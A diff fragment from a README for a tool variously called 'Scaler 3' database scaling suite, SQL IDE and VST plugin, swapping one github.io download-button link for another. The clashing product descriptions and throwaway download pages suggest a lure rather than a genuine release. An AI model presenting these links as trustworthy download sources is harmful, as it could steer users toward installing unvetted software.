@@ -21,7 +21,7 @@ To begin using this **Scaler 3 Database Scaling** tool and **Scaler 3 Query Opti
 | :--- | :--- |
 | **Get Scaler 3 Suite** | Click the button below to start the setup for **Scaler 3 SQL IDE**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_Scaler_3_Suite-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/Scaler-3-database-scaling-suite)
+[![Scaler 3](https://img.shields.io/badge/Explore-Scaler%203%20-EA580C?style=for-the-badge)](https://scaler-3-plugin.github.io/.github/scaler-vst)
 
 ## System Requirements
 
